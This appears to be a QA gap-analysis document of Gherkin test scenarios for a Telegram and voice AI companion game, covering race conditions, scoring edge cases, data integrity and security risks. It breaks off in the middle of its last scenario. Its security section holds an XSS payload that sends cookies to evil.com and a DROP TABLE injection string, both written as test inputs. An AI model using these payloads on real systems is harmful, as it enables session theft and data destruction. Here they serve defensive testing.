# E13: Gap Scenarios — Devil's Advocate Analysis (50 scenarios)

> Epic: E13 | Categories: 8 | Priority: P0=17, P1=23, P2=10, P3=0
> MCP Tools: Supabase MCP, Telegram MCP, Chrome DevTools MCP, gcloud CLI
> Source: Devil's Advocate analysis against E01-E12, cross-referenced with codebase evidence
> Source files: calculator.py, boss.py, processor.py, message_handler.py, voice.py, auth.py, portal.py, tasks.py, orchestrator.py

---

## 1. Race Conditions (8 scenarios)

```gherkin
Scenario: S-GAP-RC-1 - Decay fires while user sends message simultaneously [P0-Critical]
  Given user with relationship_score=55.2% in chapter 1, grace period expired 2h ago
  And user sends a text message at the exact moment /tasks/decay fires via pg_cron
  When both operations try to read and update the user's relationship_score
  Then one operation reads the old score and writes based on stale data (last-write-wins)
  And score_history may show inconsistent entries (decay applied to pre-message score, message applied to pre-decay score)
  And the final relationship_score is non-deterministic
  # Risk: No row-level locking found in codebase (grep for SELECT.*FOR UPDATE returned 0 results in application code)
  # Risk: db/transactions.py defines IsolationLevel.SERIALIZABLE but it's only documented as an option, not enforced on scoring paths
  # Verify: Supabase MCP → SELECT * FROM score_history WHERE user_id={uid} ORDER BY recorded_at DESC LIMIT 5 (check for overlapping timestamps)
  # Source: calculator.py:210 reads score_before, applies delta, writes score_after — no explicit lock
  # Source: processor.py:87-100 reads user.relationship_score, applies decay, writes back — no explicit lock

Scenario: S-GAP-RC-2 - Boss threshold crossed by decay reversal AND message score at same time [P1-High]
  Given user in chapter=1 with relationship_score=54.5 (threshold=55)
  And user sends a positive message (+1.0 delta, new_score=55.5, triggers boss_threshold_reached event)
  And simultaneously, a prior decay job completes and writes score to 53.8
  When the message handler reads the boss_threshold_reached event and calls trigger_boss()
  But the user's actual stored score is 53.8 (decay overwrote the +1.0)
  Then game_status becomes "boss_fight" even though score is below threshold
  And user fights a boss they shouldn't have triggered
  # Risk: calculator.py:210 detects threshold crossing, but trigger_boss() in message_handler.py:514 happens asynchronously
  # Risk: Between detection and trigger, another write can change the score
  # Verify: Supabase MCP → SELECT game_status, relationship_score FROM users WHERE id={uid} (score < threshold but game_status=boss_fight)

Scenario: S-GAP-RC-3 - Two concurrent pipeline runs for same user [P0-Critical]
  Given pg_cron fires process-conversations every 5 minutes
  And a conversation becomes stale (16 min old, status="active")
  And the first job run starts processing (sets status to "processing")
  When the job takes >5 minutes and the next pg_cron tick fires
  And the second job queries for stale conversations
  Then the second job should skip this conversation (status="processing")
  But if the first job hasn't committed status="processing" yet (transaction in progress)
  Then the second job reads status="active" and starts a parallel pipeline run
  And both runs extract duplicate memory facts, create duplicate score_history entries
  # Risk: No advisory lock or SELECT FOR UPDATE SKIP LOCKED pattern found in session_detector.py or conversation_repository.py
  # Source: conversation_repository.py:334 filters by status but doesn't lock rows
  # Verify: Supabase MCP → SELECT * FROM memory_facts WHERE user_id={uid} ORDER BY created_at DESC LIMIT 20 (check for duplicates)

Scenario: S-GAP-RC-4 - Voice call ending while text message being processed [P1-High]
  Given user with relationship_score=60.0
  And voice webhook arrives with post_call_transcription (apply_score: +3.0)
  And user sends text message to Telegram at same moment (scoring: +2.0)
  When both code paths read user_metrics (both see 60.0)
  And voice path writes 60.0 + 3.0 = 63.0
  And text path writes 60.0 + 2.0 = 62.0 (overwrites voice result)
  Then final score is 62.0 instead of correct 65.0 (lost +3.0 voice delta)
  # Risk: Same race as RC-1, affects cross-platform scoring accuracy
  # Source: voice.py:533 _process_webhook_event → scoring.py:130 apply_score (no lock)
  # Source: message_handler.py:418 _score_and_check_boss → calculator (no lock)
  # Verify: Supabase MCP → SELECT * FROM score_history WHERE user_id={uid} ORDER BY created_at DESC LIMIT 5

Scenario: S-GAP-RC-5 - pg_cron job overlap (previous run still executing) [P1-High]
  Given pg_cron fires /tasks/decay every hour
  And the current decay run is processing 500 users (takes >60 minutes due to Cloud Run cold start + LLM calls)
  When the next hourly pg_cron fires
  Then a second HTTP request hits /tasks/decay
  And both runs process the same users
  And some users get double-decayed (2x penalty in one hour)
  # Risk: No distributed lock or "last_run_completed" check before starting new run
  # Risk: job_executions table logs runs but doesn't prevent overlap
  # Source: tasks.py uses start_execution/complete_execution but doesn't check if a prior execution is in_progress
  # Verify: Supabase MCP → SELECT * FROM job_executions WHERE job_name='decay' AND status='in_progress'

Scenario: S-GAP-RC-6 - Concurrent boss judgment and timeout [P2-Medium]
  Given user in boss_fight for 23h59m (timeout is 24h)
  And user sends a boss response at 23h59m30s
  And /tasks/boss-timeout fires at 24h00m00s
  When the timeout job queries users in boss_fight > 24h
  And finds this user (updated_at was before the response started processing)
  And the timeout job increments boss_attempts and sets status="active"
  And simultaneously the boss judgment returns PASS
  Then the user might be advanced (pass) but also have an extra attempt counted (timeout)
  Or the user is set to "active" (timeout) but judgment tries to advance (pass) — state conflict
  # Risk: No mutex between boss judgment and boss timeout processing
  # Source: tasks.py:1014-1021 (boss timeout) vs boss.py:140-182 (process_pass)

Scenario: S-GAP-RC-7 - Multiple /start commands in rapid succession [P0-Critical]
  Given a brand-new user who has never interacted with the bot
  When the user sends /start 5 times in 1 second
  Then 5 webhook calls arrive at Cloud Run nearly simultaneously
  And each webhook creates a new pending_registration for the same telegram_id
  And 5 OTP emails may be sent to the same address
  And the system has 5 pending_registration rows (race on upsert)
  # Risk: rate_limiter.py MAX_PER_MINUTE=20 won't catch 5 in 1 second
  # Risk: Registration path may not have upsert/unique constraint enforcement
  # Verify: Supabase MCP → SELECT COUNT(*) FROM pending_registrations WHERE telegram_id={tid}

Scenario: S-GAP-RC-8 - Concurrent score updates during engagement state calculation [P2-Medium]
  Given user with engagement_state="in_zone" (multiplier=1.0)
  And engagement detection runs and determines user should transition to "drifting" (multiplier=0.8)
  And simultaneously a score delta is being calculated using the old multiplier (1.0)
  When the engagement state is updated to "drifting"
  Then the score delta was already applied with multiplier 1.0 instead of 0.8
  And the delta is slightly overstated
  # Risk: Engagement state read and score application are not atomic
  # Source: state_machine.py writes state, calculator.py reads state — no coordination
```

---

## 2. State Explosion (7 scenarios)

```gherkin
Scenario: S-GAP-SE-1 - boss_fight + chapter=5 + out_of_zone: near-unwinnable state [P0-Critical]
  Given user with game_status="boss_fight", chapter=5, engagement_state="out_of_zone"
  And relationship_score=75.5 (just above Ch5 threshold of 75)
  And scoring multiplier is 0.2 (out_of_zone)
  When the user sends a quality boss response that would normally score +5
  But the multiplier reduces positive gains to +5 * 0.2 = +1.0
  And the boss judgment evaluates the response text (not the score)
  Then the boss judgment PASS/FAIL is independent of the engagement multiplier
  But if the user passes, their score barely moves (+1.0) despite strong response
  And if they fail, negative deltas are full (-5 unaffected by multiplier)
  And recovery to healthy engagement is extremely slow with 0.2x multiplier
  # Risk: Engagement multiplier makes late-game recovery nearly impossible
  # Question: Is out_of_zone in Ch5 an intentional death spiral or should there be a floor?
  # Verify: enums.py:76 OUT_OF_ZONE: Decimal("0.2") — confirmed, no chapter-specific override

Scenario: S-GAP-SE-2 - active + chapter=1 + calibrating: new user with first decay hit [P1-High]
  Given a user who just completed onboarding (chapter=1, score=50, engagement=calibrating)
  And the user does not send any messages for 10 hours (grace_period=8h for Ch1)
  When decay fires (0.8%/hr, 2 hours past grace = 1.6 points)
  Then score drops from 50 to 48.4
  And user hasn't even had a chance to engage (calibrating state)
  And the boss threshold (55) becomes harder to reach
  And engagement never transitions from calibrating (no interactions to calibrate)
  # Risk: New users who get busy/forget can spiral into unwinnable state before playing
  # Missing: No "new user protection" or first-48h decay immunity
  # Verify: Supabase MCP → SELECT relationship_score, chapter, engagement_state FROM users WHERE onboarding_status='completed' AND last_interaction_at < now() - interval '10 hours'

Scenario: S-GAP-SE-3 - boss_fight + any chapter + clingy engagement [P1-High]
  Given user with engagement_state="clingy" (multiplier=0.5, flagged for excessive messaging)
  And score crosses boss threshold, triggering boss_fight
  When the user sends a boss response (which requires emotional depth, not frequency)
  Then the boss judgment evaluates response quality (not quantity)
  But the clingy state signals the user over-messages (behavioral pattern)
  And if they pass, score benefit is halved by 0.5 multiplier
  And if they fail, full negative penalty applies
  # Risk: Clingy users are punished for engagement in boss fights (perverse incentive)
  # Question: Should engagement multiplier be suspended during boss_fight? (Similar to decay suspension)

Scenario: S-GAP-SE-4 - won + out_of_zone: contradictory terminal state [P2-Medium]
  Given user in chapter=5, boss_fight, engagement_state="out_of_zone"
  And user somehow passes the final boss (judgment is text-quality based, not score-based)
  When game_status transitions to "won"
  Then engagement_state is frozen at "out_of_zone"
  And portal displays victory but engagement shows "out of zone" (contradictory UX)
  And engagement recovery path is irrelevant (game is won)
  # Risk: UX confusion — won but dashboard shows unhealthy engagement
  # Verify: Portal /dashboard — does it show engagement for won users?

Scenario: S-GAP-SE-5 - game_over + chapter=5 + in_zone: premature death at high engagement [P0-Critical]
  Given user in chapter=5, engagement_state="in_zone" (healthy), boss_attempts=2
  And score=76 (above threshold, in boss_fight)
  When user fails the final boss (3rd attempt)
  Then game_status becomes "game_over" despite in_zone engagement and high score
  And the user loses everything (no partial win, no engagement credit)
  And the restart offer resets to chapter=1, score=50 (all progress lost)
  # Risk: No "consolation" mechanic for users who were close to winning
  # Question: Should there be a "New Game+" or chapter-retention restart?
  # Verify: commands.py:106-123 — restart always resets to chapter=1, score=50

Scenario: S-GAP-SE-6 - active + chapter=1 + distant: silent new user hasn't started playing [P1-High]
  Given user with onboarding_status="completed", game_status="active", chapter=1
  And user has never sent a non-onboarding message (0 conversations)
  And 72 hours pass (decay applied multiple times)
  When engagement detection runs
  Then user is flagged as "distant" (no interaction in 48+ hours)
  And decay has reduced score from 50 to ~31 (0.8%/hr for ~24 hours past grace)
  And the user has never actually played the game
  And game_over is approaching from pure inactivity
  # Missing: No scenario covers "completed onboarding but never played"
  # Missing: No re-engagement touchpoint for users who onboarded but went silent

Scenario: S-GAP-SE-7 - boss_fight + chapter transition + pipeline processing overlap [P1-High]
  Given user has game_status="boss_fight" (triggered by prior conversation)
  And a pre-boss conversation is still in status="active" (not yet processed)
  When pipeline picks up this older conversation for processing
  Then pipeline's terminal-state filter checks game_status and skips (game_status="boss_fight" is in SKIP_STATUSES)
  But this conversation had valid data that should have been processed (it was sent BEFORE boss_fight)
  And memory facts from this conversation are never extracted
  # Risk: Spec 049 terminal filter is too aggressive — it blocks processing of pre-boss conversations
  # Source: orchestrator.py:148-161 skips based on current game_status, not conversation creation time
  # Verify: Supabase MCP → SELECT * FROM conversations WHERE user_id={uid} AND status='active' AND started_at < (SELECT updated_at FROM users WHERE id={uid} AND game_status='boss_fight')
```

---

## 3. Security Gaps (8 scenarios)

```gherkin
Scenario: S-GAP-SEC-1 - IDOR: Accessing another user's portal data [P0-Critical]
  Given user_A is authenticated with valid JWT (sub=user_A_id)
  When user_A calls GET /api/v1/portal/conversations?user_id={user_B_id}
  Or user_A calls GET /api/v1/portal/score-history?user_id={user_B_id}
  Then the API should return only user_A's data (enforced by get_current_user_id dependency)
  But if any endpoint accepts user_id as a query parameter and doesn't validate against JWT sub
  Then user_A can read user_B's conversations, scores, diary, and vice preferences
  # Risk: Portal endpoints must derive user_id from JWT, never from query params
  # Verify: auth.py:17 get_current_user_id extracts from JWT sub — confirmed, but verify all portal routes use it

Scenario: S-GAP-SEC-2 - Admin endpoint authorization bypass via JWT manipulation [P0-Critical]
  Given a regular user with email "player@gmail.com"
  And admin check is domain-based: email.endswith("@silent-agents.com")
  When the user creates a Supabase account with email "admin@silent-agents.com"
  Then they can register via OTP (Supabase sends OTP to any email)
  And their JWT contains email="admin@silent-agents.com"
  And they pass the _is_admin_email() check in auth.py:95
  And they gain full admin access to all user data
  # Risk: Domain-based admin check is bypassable if anyone can register with @silent-agents.com email
  # Source: auth.py:92 ADMIN_EMAIL_DOMAIN = "@silent-agents.com"
  # Source: auth.py:109 email.lower().endswith(ADMIN_EMAIL_DOMAIN)
  # Mitigation: Restrict registration to whitelisted emails or use Supabase auth hooks

Scenario: S-GAP-SEC-3 - SQL injection via Telegram message content [P1-High]
  Given a registered user with active game
  When the user sends a Telegram message containing: "'; DROP TABLE users; --"
  And the message is stored in conversations.messages JSON
  Then SQLAlchemy ORM parameterizes all queries (safe by default)
  But if any raw SQL queries concatenate user input (e.g., ILIKE '%{search}%')
  Then injection is possible
  # Risk: Admin search endpoint (GET /api/v1/admin/users?search=...) may use raw SQL for ILIKE
  # Verify: grep for "f\"" or ".format(" or "%" in SQL query contexts in portal.py/admin routes

Scenario: S-GAP-SEC-4 - XSS via Telegram message displayed in portal [P0-Critical]
  Given a registered user sends message: "<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>"
  And the message is stored in conversations.messages JSON
  When an admin or the user views this conversation in the portal (/conversations/{id})
  Then the portal renders the message content
  And if the portal doesn't sanitize/escape HTML in message display
  Then the script executes in the admin's browser (stealing session cookie)
  # Risk: Next.js default escapes JSX interpolation, but dangerouslySetInnerHTML or markdown renderers may not
  # Risk: Admin viewing user conversations is highest-impact target
  # Verify: Chrome DevTools MCP → navigate to conversation detail, check if script tags are escaped

Scenario: S-GAP-SEC-5 - Webhook replay attack (Telegram) [P1-High]
  Given an attacker captures a valid webhook request with valid X-Telegram-Bot-Api-Secret-Token
  When the attacker replays the exact same request 1 hour later
  Then the webhook processes the message again (no replay protection)
  And the user gets double-scored for the same message
  And a duplicate conversation entry may be created
  # Risk: Telegram webhook validation checks the secret token but not timestamp/nonce
  # Source: telegram.py:543 uses hmac.compare_digest (correct) but no timestamp check
  # Contrast: ElevenLabs webhook (voice.py:484) checks timestamp within 300s tolerance

Scenario: S-GAP-SEC-6 - TASK_AUTH_SECRET brute force [P1-High]
  Given all /tasks/* endpoints are protected by Authorization: Bearer {TASK_AUTH_SECRET}
  And the endpoints are publicly accessible (Cloud Run --allow-unauthenticated)
  When an attacker sends 1000 requests per second with random Bearer tokens
  Then there is no rate limiting on task endpoints (rate_limiter only on Telegram messages)
  And if TASK_AUTH_SECRET is weak, brute force succeeds
  And attacker can trigger arbitrary decay, game_over, cleanup operations
  # Risk: No rate limiting or IP blocking on task endpoints
  # Source: tasks.py:78-80 verify_task_secret raises HTTPException 401 but no lockout

Scenario: S-GAP-SEC-7 - ElevenLabs signed_token reuse across sessions [P0-Critical]
  Given a valid signed_token was generated for session voice_inbound_user123_20260214
  And the voice call ends (session finalized)
  When the signed_token is used to call server tools (get_context, score_turn, update_memory)
  Then the token is still valid for 1800 seconds (30 min) regardless of session state
  And an attacker with a leaked token can repeatedly score_turn with fabricated transcripts
  And artificially inflate/deflate the user's score
  # Risk: Token validity is time-based (30 min) not session-lifecycle-based
  # Source: voice.py:345 _validate_signed_token checks timestamp only, not session status

Scenario: S-GAP-SEC-8 - Account deletion doesn't revoke active sessions [P1-High]
  Given a user logged into portal with valid JWT (expires in 1 hour)
  When the user deletes their account via DELETE /api/v1/portal/account?confirm=true
  Then the user record is deleted (CASCADE deletes all related data)
  But the JWT is still valid (stateless, not revoked)
  And the user can still call portal API endpoints for up to 1 hour
  And get_current_user_id returns a UUID that no longer exists in the database
  And API calls may return 500 (user not found) or empty data
  # Risk: No token blacklist or session invalidation on account deletion
  # Source: portal.py:511 deletes user but doesn't invalidate Supabase session
```

---

## 4. Data Integrity (6 scenarios)

```gherkin
Scenario: S-GAP-DI-1 - Score updated but score_history write fails [P0-Critical]
  Given user with relationship_score=60
  When a scoring operation updates user.relationship_score to 63
  And then attempts to insert a score_history record
  But the score_history insert fails (constraint violation, disk full, etc.)
  Then user.relationship_score is 63 (committed)
  But score_history has no record of this change
  And the portal score chart has a gap (missing data point)
  And audit trail is broken
  # Risk: Score update and history logging are not in the same transaction
  # Verify: Check if calculator.py update and history_repo.log_event share a session.commit()
  # Verify: Supabase MCP → SELECT relationship_score FROM users vs SELECT MAX(score) FROM score_history WHERE user_id={uid}

Scenario: S-GAP-DI-2 - Partial pipeline completion leaves orphaned data [P0-Critical]
  Given a conversation is being processed by the 9-stage pipeline
  And extraction stage (critical=true) succeeds (extracts 3 facts)
  And memory_update stage (critical=true) fails (pgVector connection error)
  When the pipeline stops (critical stage failed)
  Then the conversation is marked as "failed"
  But the extraction stage already wrote intermediate data
  And 3 extracted entities exist in a temporary/intermediate state
  And when the conversation is retried, extraction runs again (duplicate entities possible)
  # Risk: No idempotency guarantee on pipeline stages
  # Source: orchestrator.py:40 extraction is_critical=True, orchestrator.py:41 memory_update is_critical=True
  # Verify: Supabase MCP → SELECT COUNT(*) FROM memory_facts WHERE conversation_id={cid} GROUP BY fact (check for duplicates after retry)

Scenario: S-GAP-DI-3 - Memory fact duplication across platforms [P1-High]
  Given user tells Nikita "I work at Google" via Telegram text (conversation_1, text platform)
  And the pipeline extracts memory_fact: "User works at Google"
  When user later tells Nikita "yeah I'm at Google" via voice call (conversation_2, voice platform)
  And the voice pipeline also extracts: "User works at Google"
  Then two memory_facts exist for the same semantic information
  And future prompt generation includes the fact twice (wastes token budget)
  And semantic dedup depends on pgVector similarity threshold
  # Risk: SupabaseMemory.add_fact() may not catch near-duplicate facts from different platforms
  # Source: memory/supabase_memory.py dedup logic — verify cosine similarity threshold
  # Verify: Supabase MCP → SELECT fact FROM memory_facts WHERE user_id={uid} AND fact ILIKE '%Google%'

Scenario: S-GAP-DI-4 - Conversation with 0 messages processed by pipeline [P1-High]
  Given a conversation created when user sent /start but no actual messages exchanged
  And conversation.messages = [] (empty JSON array)
  And conversation.status = "active" and last_message_at = created_at (>15 min ago)
  When process-conversations detects this as stale
  And the pipeline attempts to process it
  Then extraction stage receives empty transcript
  And may produce no facts, no errors, no meaningful output
  And summary stage generates a summary of nothing (LLM hallucination risk)
  And the conversation is marked "processed" with empty/hallucinated data
  # Risk: Pipeline doesn't validate minimum message count before processing
  # Verify: Supabase MCP → SELECT * FROM conversations WHERE messages = '[]' AND status = 'processed'

Scenario: S-GAP-DI-5 - Orphaned records after user deletion via Supabase auth [P1-High]
  Given an admin deletes a user directly from the Supabase auth dashboard
  When the auth.users row is deleted
  Then the app_users row remains (foreign key may reference auth.users.id but not cascade)
  And the user's conversations, score_history, memory_facts all remain
  And the portal delete endpoint was never called (delete_user_cascade never ran)
  And the user becomes a ghost: no auth record but full game data
  And pg_cron jobs still process this user (decay, summaries, etc.)
  # Risk: Supabase auth deletion doesn't trigger application-level cascade
  # Verify: Supabase MCP → SELECT * FROM users WHERE id NOT IN (SELECT id FROM auth.users)

Scenario: S-GAP-DI-6 - Score clamping at 0 without game_over trigger [P2-Medium]
  Given user with relationship_score=2 and game_status="active"
  When a negative interaction scores delta=-5
  And score is clamped to 0 (max(0, 2-5))
  And score_history records the delta
  But the scoring code path doesn't check for game_over trigger (only decay path does)
  Then relationship_score=0 but game_status remains "active"
  And the user is in a zombie state (score=0, still receiving messages)
  # Risk: Only processor.py (decay) triggers game_over when score=0. Does calculator.py also check?
  # Source: calculator.py clamps at 0 but may not set game_status
  # Source: processor.py:113 game_over_triggered = score_after == 0 (only in decay path)
  # Verify: Send very negative message to user with low score, check game_status afterwards
```

---

## 5. Cross-Platform Edge Cases (5 scenarios)

```gherkin
Scenario: S-GAP-XP-1 - Voice call initiated during active boss fight text conversation [P0-Critical]
  Given user with game_status="boss_fight" in chapter 3
  And the boss opening message was sent via Telegram text
  When the user initiates a voice call (availability returns true for boss_fight)
  And talks to Nikita about the boss challenge verbally
  Then the voice call is scored normally (+/- deltas applied)
  But the boss judgment expects a TEXT response in _handle_boss_response()
  And the voice call response is NOT evaluated by BossJudgment
  And the boss_fight state persists indefinitely (user thinks they responded, but via wrong channel)
  # Risk: Boss fight is text-only but voice availability returns true for boss_fight state
  # Source: availability.py:88-91 boss_fight always returns (True, "Boss encounter")
  # Source: message_handler.py:175 routes boss text to _handle_boss_response — no voice equivalent
  # Verify: Supabase MCP → voice conversation exists while game_status="boss_fight"

Scenario: S-GAP-XP-2 - Portal cache shows stale data after text/voice scoring [P1-High]
  Given user sends message via Telegram and score updates from 60 to 63
  When user immediately opens portal dashboard
  Then the dashboard may show 60 (stale cache or API response)
  And the score chart doesn't include the latest data point
  And the user sees inconsistent data between platforms
  # Risk: Next.js SSR may cache API responses, or Supabase response may be from read replica
  # Verify: Chrome DevTools → navigate to /dashboard immediately after Telegram message

Scenario: S-GAP-XP-3 - Two Telegram accounts try to link to same portal account [P1-High]
  Given user_A registered via Telegram with email "user@test.com" (telegram_id=111)
  And user_B registers via Telegram with same email "user@test.com" (telegram_id=222)
  When user_B tries to complete OTP for "user@test.com"
  Then Supabase auth has one account for "user@test.com"
  And user_B may hijack user_A's account (same auth user, different telegram_id)
  Or the system creates a conflict (telegram_id unique constraint violation)
  # Risk: Email is used as the identity key, but telegram_id is the interaction key
  # Verify: Supabase MCP → SELECT telegram_id FROM users WHERE email='user@test.com' — should be unique

Scenario: S-GAP-XP-4 - Admin viewing user data while pipeline is running [P1-High]
  Given admin navigates to /admin/users/{user_id} to view real-time metrics
  And the pipeline is currently processing this user's conversation (status="processing")
  When the admin reads engagement_state, metrics, and score
  Then the values may be mid-update (partially written by pipeline stages)
  And the admin sees inconsistent data (e.g., emotional state updated but score not yet)
  And a refresh 10 seconds later shows different values
  # Risk: No read consistency guarantee during pipeline processing
  # Risk: Pipeline stages commit incrementally, not atomically

Scenario: S-GAP-XP-5 - User deletes account via portal while voice call is active [P2-Medium]
  Given user is on an active voice call (session status="ACTIVE")
  And user has portal open in another tab
  When user deletes account via DELETE /api/v1/portal/account?confirm=true
  Then all user data is CASCADE deleted from database
  But the voice call is still in progress on ElevenLabs
  And server tools (get_context, score_turn) will fail (user not found)
  And the webhook (post_call_transcription) will arrive after deletion
  And webhook processing will fail or create orphaned data
  # Risk: No mechanism to terminate active voice session on account deletion
  # Source: portal.py:511 delete_user_cascade doesn't notify voice service
```

---

## 6. Timing Edge Cases (5 scenarios)

```gherkin
Scenario: S-GAP-TE-1 - Message arrives exactly at grace period boundary [P0-Critical]
  Given user in chapter=1 with last_interaction_at = now() - interval '8 hours' (grace_period=8h)
  And the decay job fires at this exact moment
  And the user sends a message at this exact moment
  When decay checks: time_since_last = 8h00m00s >= grace_period (8h) → decay APPLIES
  And message handler updates last_interaction_at to now()
  Then whether decay applies depends on which operation reads first
  And the user may be decayed even though they just sent a message
  # Risk: Boundary condition — calculator.py:70-72 uses >= (inclusive), so exact boundary = decay applied
  # Source: calculator.py boundary check — verify operator (>= vs >)

Scenario: S-GAP-TE-2 - Boss threshold hit by exact penny (55.0000% for Ch1) [P1-High]
  Given user in chapter=1 with relationship_score=54.5
  When a positive delta of exactly +0.5 is applied
  Then score_after = 55.0000 (exactly equals BOSS_THRESHOLDS[1] = Decimal("55.00"))
  And calculator.py:210 checks: score_before < boss_threshold <= score_after
  And 54.5 < 55.0 <= 55.0 is TRUE
  Then boss_threshold_reached event fires correctly
  # Verify: This IS covered by S-3.1.5, but validate Decimal precision handling
  # Risk: Float vs Decimal comparison if any code path uses float()

Scenario: S-GAP-TE-3 - Clock skew between pg_cron and Cloud Run [P0-Critical]
  Given pg_cron fires /tasks/decay at 14:00:00 UTC
  And the HTTP request takes 3 seconds to reach Cloud Run (cold start)
  When the decay processor checks last_interaction_at against now()
  Then "now()" on Cloud Run is 14:00:03, but pg_cron scheduled at 14:00:00
  And grace period calculations are off by 3 seconds (negligible for hourly checks)
  But during a Cloud Run cold start (15-90 seconds), the skew is significant
  And users at exact grace boundaries may be incorrectly included/excluded
  # Risk: Cold start of 83.8s observed in E2E (workbook.md line 31)
  # Verify: Supabase MCP → SELECT * FROM cron.job_run_details WHERE jobid={decay_job_id} ORDER BY start_time DESC LIMIT 5

Scenario: S-GAP-TE-4 - ElevenLabs webhook arrives before call.ended event [P1-High]
  Given a voice call is active (session status="ACTIVE")
  When ElevenLabs sends post_call_transcription webhook
  But the call hasn't technically ended (VoiceSessionManager still has status="ACTIVE")
  Then the webhook processes the transcript and scores the call
  And a conversation record is created
  But the session is still "ACTIVE" in the session manager
  And if the user continues talking after this point, those utterances are lost
  # Risk: ElevenLabs may send webhooks before our session lifecycle catches up
  # Source: inbound.py:88-141 session lifecycle vs voice.py:533 webhook processing

Scenario: S-GAP-TE-5 - Scheduled event delivered to user who just entered boss_fight [P2-Medium]
  Given the touchpoint engine scheduled a message for 9:00 AM
  And at 8:59 AM the user's score crossed the boss threshold (game_status → boss_fight)
  When /tasks/deliver fires at 9:00 AM and sends the scheduled touchpoint
  Then the user receives a casual Nikita message ("Hey, thinking of you...")
  Immediately followed by or concurrent with the boss encounter message
  And the user is confused (two very different tones: casual + challenge)
  # Risk: Scheduled events don't check current game_status before delivery
  # Source: tasks.py:306-331 delivers events without checking user state
```

---

## 7. Recovery & Resilience (5 scenarios)

```gherkin
Scenario: S-GAP-RR-1 - Cloud Run cold start during boss fight response [P0-Critical]
  Given user in boss_fight sends their carefully crafted response via Telegram
  And the Cloud Run instance has scaled to zero (idle for >15 minutes)
  When the Telegram webhook hits Cloud Run
  Then Cloud Run cold starts (15-90 seconds observed, up to 83.8s in E2E)
  And the boss judgment requires an LLM call (Claude Sonnet, 120s timeout)
  And total time = cold_start + LLM_call could exceed 200+ seconds
  And Cloud Run timeout is 300s (Spec 036 fix)
  But Telegram webhook expects a response within 60 seconds
  And Telegram may retry the webhook (duplicate processing)
  # Risk: Telegram retries on timeout could cause double boss judgment
  # Source: Cloud Run timeout=300s, but Telegram webhook timeout is shorter

Scenario: S-GAP-RR-2 - Neo4j/Supabase connection timeout during pipeline [P0-Critical]
  Given 10 conversations are being processed concurrently
  And each pipeline run opens multiple DB connections (9 stages)
  When the Supabase connection pool reaches its limit
  Then subsequent pipeline stages fail with connection timeout
  And some conversations are partially processed (early stages committed, later stages failed)
  And the "recover-stuck" job detects these as stuck (status="processing" for >30 min)
  And recovery resets them to retryable state
  But retry will face the same pool exhaustion if load hasn't decreased
  # Risk: No connection pool monitoring or backpressure
  # Source: Spec 036 fix: Neo4j pooling improvements, but Supabase pool may still saturate

Scenario: S-GAP-RR-3 - LLM API rate limit during boss judgment [P1-High]
  Given 5 users enter boss_fight simultaneously
  And each boss judgment calls Claude Sonnet (judgment.py)
  When the Claude API returns 429 (rate limit exceeded)
  Then BossJudgment.judge_boss_outcome() fails
  And the exception handling determines the outcome
  And if the exception causes a FAIL outcome, the user is unfairly penalized
  And if the exception causes no outcome, the user is stuck in boss_fight
  # Risk: LLM failure during boss judgment has disproportionate impact (game-altering)
  # Source: judgment.py uses LLM (Claude Sonnet) — verify error handling path

Scenario: S-GAP-RR-4 - Partial deployment: new boss logic, old scoring [P1-High]
  Given Cloud Run is deploying a new revision with updated boss pass messages (BOSS-MSG-1 fix)
  And a user's boss judgment was evaluated by revision N (old code)
  When the boss pass response is sent by revision N+1 (new code, different messages)
  Then the transition is seamless (HTTP is stateless, no server-side session state)
  But if the new revision changes scoring logic or threshold values
  Then a user's score was calculated with old thresholds but boss trigger uses new thresholds
  # Risk: Cloud Run traffic split during rollout means some requests hit old code, some new
  # Risk: Non-atomic deployment of scoring + boss logic can create inconsistencies

Scenario: S-GAP-RR-5 - OTP email delivery failure (Supabase email provider down) [P2-Medium]
  Given a new user enters their email for registration
  When Supabase's email provider (e.g., GoTrue SMTP) is down
  Then the OTP send fails silently (registration_handler.py:86 now logs exc_info=True)
  And the user receives "Something went wrong" message
  And the user can retry via /start
  But if the email provider is down for hours, no new users can register
  And there's no fallback authentication method (no SMS OTP, no magic link alternative)
  # Risk: Single point of failure for registration
  # Source: OTP-SILENT fix ensures logging, but doesn't provide fallback auth
```

---

## 8. Missing User Journeys (6 scenarios)

```gherkin
Scenario: S-GAP-MJ-1 - User sends /help or unknown command [P1-High]
  Given a registered user with active game
  When the user sends "/help" or "/status" or "/score"
  Then the bot should respond with available commands or game status
  But no scenario covers non-/start commands
  And the behavior depends on whether commands.py has a command handler for these
  # Missing: No scenarios for /help, /status, /score, /quit, or unknown commands
  # Verify: grep for "help\|status\|score\|quit" in commands.py or message_handler.py

Scenario: S-GAP-MJ-2 - User sends message in non-English language [P1-High]
  Given Nikita's prompts are all in English
  And the user sends "Hallo Nikita, wie geht es dir?" (German)
  When the message is processed by the LLM
  Then the LLM may respond in German (matching user language)
  Or the LLM responds in English (matching system prompt)
  And scoring analysis may fail or produce inaccurate results (English-trained analysis)
  And vice detection may miss non-English signals
  # Missing: No multilingual scenarios in the story bank
  # Risk: System prompts are English-only, non-English users get degraded experience

Scenario: S-GAP-MJ-3 - User loses internet mid-onboarding (mobile network) [P2-Medium]
  Given user completed onboarding questions 1-3
  And user's phone loses network connectivity for 2 hours
  When user regains connectivity and sends a message
  Then onboarding should resume from question 4 (scenario S-1.2.4 covers this)
  But what if the user sends a regular message instead of an onboarding answer?
  And message_handler routes to onboarding (profile gate check)
  And the regular message is interpreted as an onboarding answer
  And the user's interests are set to "How's your day going?" (wrong data)
  # Risk: Any message during onboarding is treated as an answer to the current question
  # Verify: Send a casual message during onboarding — is it forced into the answer field?

Scenario: S-GAP-MJ-4 - Rapid chapter progression (speed run) [P0-Critical]
  Given a user with chapter=1, score=50
  When the user sends extremely high-quality messages rapidly
  And scores +5 per message (max realistic delta)
  And reaches threshold 55 after ~1 message
  And passes boss, advances to chapter 2 (threshold 60)
  And continues with more high-quality messages
  Then the user could theoretically pass all 5 bosses in one sitting (30-60 minutes)
  And decay never applies (user is continuously active)
  And engagement never transitions from "calibrating" (too fast for state machine)
  And the entire game experience collapses into a single session
  # Risk: No cooldown between boss fights, no minimum time per chapter
  # Risk: Game design intention is gradual relationship building over days/weeks
  # Verify: Check CHAPTER_BEHAVIORS for minimum day_range values

Scenario: S-GAP-MJ-5 - User tries to manipulate score via copy-paste quality responses [P1-High]
  Given a user uses an external LLM to generate emotionally perfect responses
  And sends these responses to Nikita via Telegram
  When the scoring LLM (Claude Sonnet) analyzes these responses
  Then the responses score maximally on all 4 metrics
